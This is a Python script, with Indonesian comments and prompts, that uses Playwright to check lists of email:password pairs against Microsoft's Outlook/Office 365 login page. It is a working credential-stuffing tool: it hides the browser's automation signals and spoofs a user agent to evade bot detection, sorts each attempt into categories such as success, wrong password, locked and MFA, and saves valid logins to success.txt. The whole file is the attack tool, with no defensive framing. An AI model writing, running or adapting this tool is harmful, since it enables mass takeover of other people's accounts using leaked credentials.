import asyncio
import os
import sys
from datetime import datetime

try:
    from playwright.async_api import async_playwright
except ImportError:
    print("❌ Playwright belum terinstall!")
    print("   Jalankan: pip install playwright")
    print("   Lalu: playwright install chromium")
    sys.exit(1)

# ============================================
#   WARNA TERMINAL
# ============================================
class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════╗
║     🔐 Microsoft Account Login Checker      ║
║          Outlook / Office 365                ║
╚══════════════════════════════════════════════╝{Colors.RESET}
""")

def timestamp():
    return datetime.now().strftime("%H:%M:%S")

# ============================================
#   BACA FILE ACCOUNTS
# ============================================
def load_accounts(filepath):
    accounts = []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if ":" in line and line:
                    parts = line.split(":", 1)
                    email = parts[0].strip()
                    password = parts[1].strip()
                    if email and password:
                        accounts.append((email, password))
    except FileNotFoundError:
        print(f"{Colors.RED}❌ File tidak ditemukan: {filepath}{Colors.RESET}")
        sys.exit(1)
    return accounts

# ============================================
#   CHECK SINGLE ACCOUNT
# ============================================
async def check_account(page, email, password, index, total):
    prefix = f"[{timestamp()}] [{index}/{total}]"
    print(f"{Colors.CYAN}{prefix} ⏳ Checking: {email}{Colors.RESET}")

    try:
        # 1) Navigasi ke halaman login Microsoft
        await page.goto(
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
            "?client_id=9199b020-a13f-4107-85dc-07114787e498"
            "&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access"
            "&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fowa%2F"
            "&response_type=code"
            "&prompt=login",
            wait_until="domcontentloaded",
            timeout=30000
        )

        # 2) Tunggu input email muncul
        email_input = page.locator('input[type="email"], input[name="loginfmt"]')
        await email_input.wait_for(state="visible", timeout=15000)
        await email_input.fill(email)
        await asyncio.sleep(0.5)

        # Klik Next
        next_btn = page.locator('input[type="submit"], button[type="submit"]')
        await next_btn.click()

        # 3) Tunggu: apakah password muncul atau error email
        try:
            result = await asyncio.wait_for(
                wait_for_password_or_error(page),
                timeout=15
            )
        except asyncio.TimeoutError:
            result = "timeout"

        if result == "email_error":
            print(f"{Colors.RED}{prefix} ❌ FAILED: {email} | Akun tidak ditemukan{Colors.RESET}")
            return "failed", f"{email}:{password} | Akun tidak ditemukan"
        elif result == "timeout":
            print(f"{Colors.RED}{prefix} ❌ FAILED: {email} | Timeout di halaman email{Colors.RESET}")
            return "failed", f"{email}:{password} | Timeout di halaman email"

        # 4) Masukkan password
        password_input = page.locator('input[type="password"]:visible')
        await password_input.fill(password)
        await asyncio.sleep(0.3)

        # Klik Sign in
        submit_btn = page.locator('input[type="submit"]:visible, button[type="submit"]:visible')
        await submit_btn.click()

        # 5) Tunggu hasil: race condition antara berbagai kemungkinan
        try:
            result_status = await asyncio.wait_for(
                wait_for_login_result(page),
                timeout=20
            )
        except asyncio.TimeoutError:
            result_status = "unknown"

        # 6) Proses hasil
        if result_status == "success":
            print(f"{Colors.GREEN}{prefix} ✅ SUCCESS: {email} | Login berhasil!{Colors.RESET}")
            return "success", f"{email}:{password}"
        elif result_status == "wrong_password":
            print(f"{Colors.RED}{prefix} ❌ FAILED: {email} | Password salah{Colors.RESET}")
            return "failed", f"{email}:{password} | Password salah"
        elif result_status == "locked":
            print(f"{Colors.YELLOW}{prefix} 🔒 LOCKED: {email} | Akun terkunci{Colors.RESET}")
            return "failed", f"{email}:{password} | Akun terkunci"
        elif result_status == "mfa":
            print(f"{Colors.YELLOW}{prefix} 🔐 FAILED: {email} | MFA / Approve sign in request{Colors.RESET}")
            return "failed", f"{email}:{password} | MFA - Approve sign in request"
        elif result_status == "access_denied":
            print(f"{Colors.YELLOW}{prefix} 🚫 FAILED: {email} | You cannot access this right now{Colors.RESET}")
            return "failed", f"{email}:{password} | You cannot access this right now"
        else:
            # Cek terakhir - mungkin sudah redirect ke outlook
            current_url = page.url
            if any(x in current_url.lower() for x in ["outlook.live", "outlook.office", "office.com/owa", "mail."]):
                print(f"{Colors.GREEN}{prefix} ✅ SUCCESS: {email} | Login berhasil (redirected)!{Colors.RESET}")
                return "success", f"{email}:{password}"
            print(f"{Colors.GREEN}{prefix} ✅ SUCCESS (UNKNOWN): {email} | Status tidak diketahui, masuk success{Colors.RESET}")
            return "success", f"{email}:{password}"

    except Exception as e:
        err_msg = str(e).split('\n')[0][:80]
        print(f"{Colors.RED}{prefix} ❌ ERROR: {email} | {err_msg}{Colors.RESET}")
        return "failed", f"{email}:{password} | Error: {err_msg}"


async def wait_for_password_or_error(page):
    """Tunggu sampai halaman password muncul atau error email muncul"""
    while True:
        try:
            # Cek password input visible
            pwd = page.locator('input[type="password"]:visible')
            if await pwd.count() > 0:
                return "password_ready"
            # Cek error email
            err = page.locator('#usernameError:visible, [data-testid="usernameError"]:visible')
            if await err.count() > 0:
                return "email_error"
            # Cek juga text error di body
            body_text = await page.locator("body").inner_text()
            if "doesn't exist" in body_text.lower() or "we couldn't find" in body_text.lower():
                return "email_error"
        except:
            pass
        await asyncio.sleep(0.5)


async def wait_for_login_result(page):
    """Tunggu sampai salah satu hasil login muncul, pakai polling"""
    for _ in range(40):  # 40 x 0.5s = 20 detik max
        try:
            current_url = page.url.lower()

            # ---- SUCCESS: Redirect ke Outlook / Office ----
            if any(x in current_url for x in [
                "outlook.live.com", "outlook.office.com", "outlook.office365.com",
                "office.com/owa", "mail.", "login.srf"
            ]):
                return "success"

            # ---- SUCCESS: Stay signed in / KMSI ----
            if "kmsi" in current_url:
                return "success"

            body_text = ""
            try:
                body_text = await page.locator("body").inner_text()
                body_lower = body_text.lower()
            except:
                await asyncio.sleep(0.5)
                continue

            # ---- SUCCESS: Stay signed in? ----
            if "stay signed in" in body_lower or "keep me signed in" in body_lower:
                return "success"

            # ---- WRONG PASSWORD ----
            if any(x in body_lower for x in [
                "your account or password is incorrect",
                "password is incorrect",
                "that password is incorrect",
                "the password is incorrect"
            ]):
                return "wrong_password"

            # ---- ACCOUNT LOCKED ----
            if any(x in body_lower for x in [
                "account is locked",
                "account has been locked",
                "been locked",
                "temporarily locked",
                "temporarily locked to prevent unauthorised use",
                "too many attempts"
            ]):
                return "locked"

            # ---- MFA / APPROVE SIGN IN ----
            if any(x in body_lower for x in [
                "approve sign in request",
                "approve sign-in request",
                "verify your identity",
                "enter the number shown",
                "open your authenticator",
                "more information required",
                "confirm your identity",
                "enter code",
                "enter the code displayed in the authenticator",
            ]):
                return "mfa"

            # ---- ACCESS DENIED ----
            if any(x in body_lower for x in [
                "you cannot access this right now",
                "cannot access this",
                "does not meet the criteria",
                "sign in was successful but"
            ]):
                return "access_denied"

            # ---- Cek apakah masih di halaman password (belum pindah) ----
            pwd_input = page.locator('input[type="password"]:visible')
            if await pwd_input.count() > 0:
                # Cek apakah ada error di halaman password
                err_div = page.locator('#passwordError:visible, [data-testid="passwordError"]:visible')
                if await err_div.count() > 0:
                    err_text = await err_div.inner_text()
                    if "incorrect" in err_text.lower():
                        return "wrong_password"
                    elif "locked" in err_text.lower():
                        return "locked"
                # Masih loading, tunggu
                await asyncio.sleep(0.5)
                continue

        except Exception:
            pass

        await asyncio.sleep(0.5)

    return "unknown"


# ============================================
#   MAIN
# ============================================
async def main():
    banner()

    # Input file path
    print(f"{Colors.WHITE}📂 Masukkan path file accounts (email:password):{Colors.RESET}")
    filepath = input(f"{Colors.CYAN}   > {Colors.RESET}").strip().strip('"').strip("'")

    if not os.path.exists(filepath):
        print(f"{Colors.RED}❌ File tidak ditemukan!{Colors.RESET}")
        return

    accounts = load_accounts(filepath)
    if not accounts:
        print(f"{Colors.RED}❌ Tidak ada akun ditemukan di file!{Colors.RESET}")
        return

    print(f"\n{Colors.GREEN}✅ Ditemukan {len(accounts)} akun untuk dicek{Colors.RESET}")

    # Pilih mode browser
    print(f"\n{Colors.WHITE}Tampilkan browser saat pengecekan?{Colors.RESET}")
    print(f"  {Colors.CYAN}[1]{Colors.RESET} Sembunyikan browser (headless) - Lebih cepat")
    print(f"  {Colors.CYAN}[2]{Colors.RESET} Tampilkan browser (visible) - Bisa lihat proses")
    mode = input(f"{Colors.CYAN}  Pilih (1/2) [default: 1]: {Colors.RESET}").strip()
    headless = mode != "2"

    print(f"\n{Colors.YELLOW}{'='*50}")
    print(f"  🚀 Memulai pengecekan...")
    print(f"  📊 Total: {len(accounts)} akun")
    print(f"  🖥️  Mode: {'Headless' if headless else 'Visible'}")
    print(f"{'='*50}{Colors.RESET}\n")

    success_list = []
    failed_list = []

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
            ]
        )

        for i, (email, password) in enumerate(accounts, 1):
            # Buat context baru untuk setiap akun (session bersih)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                viewport={"width": 1280, "height": 720},
                locale="en-US",
            )
            page = await context.new_page()

            status, result = await check_account(page, email, password, i, len(accounts))

            if status == "success":
                success_list.append(result)
            else:
                failed_list.append(result)

            # Tutup context (clear session/cookies)
            await context.close()

            # Delay antar akun
            if i < len(accounts):
                await asyncio.sleep(1)

        await browser.close()

    # ============================================
    #   SIMPAN HASIL
    # ============================================
    output_dir = os.path.dirname(os.path.abspath(filepath))

    success_file = os.path.join(output_dir, "success.txt")
    failed_file = os.path.join(output_dir, "failed.txt")

    with open(success_file, "w", encoding="utf-8") as f:
        for line in success_list:
            f.write(line + "\n")

    with open(failed_file, "w", encoding="utf-8") as f:
        for line in failed_list:
            f.write(line + "\n")

    # ============================================
    #   SUMMARY
    # ============================================
    print(f"\n{Colors.YELLOW}{'='*50}")
    print(f"  📊 HASIL PENGECEKAN")
    print(f"{'='*50}{Colors.RESET}")
    print(f"  {Colors.GREEN}✅ Success : {len(success_list)}{Colors.RESET}")
    print(f"  {Colors.RED}❌ Failed  : {len(failed_list)}{Colors.RESET}")
    print(f"  {Colors.CYAN}📁 Total   : {len(accounts)}{Colors.RESET}")
    print(f"\n  {Colors.WHITE}📄 Hasil disimpan di:{Colors.RESET}")
    print(f"     {Colors.GREEN}✅ {success_file}{Colors.RESET}")
    print(f"     {Colors.RED}❌ {failed_file}{Colors.RESET}")
    print(f"{Colors.YELLOW}{'='*50}{Colors.RESET}\n")

    # Tampilkan akun yang berhasil
    if success_list:
        print(f"\n{Colors.GREEN}{Colors.BOLD}  ✅ AKUN BERHASIL LOGIN:{Colors.RESET}")
        for acc in success_list:
            print(f"     {Colors.GREEN}{acc}{Colors.RESET}")
        print()


if __name__ == "__main__":
    asyncio.run(main())
